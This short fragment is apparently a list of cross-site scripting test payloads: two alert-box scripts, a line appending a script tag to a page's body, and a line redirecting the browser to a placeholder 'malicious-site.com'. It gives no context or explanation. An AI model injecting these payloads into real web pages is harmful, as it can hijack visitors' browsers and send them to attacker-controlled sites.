window.location = 'http://malicious-site.com';
document.body.innerHTML += '<script>alert("XSS Successful!");</script>';
alert('XSS Test');
<script>alert("XSS Successful!");</script>
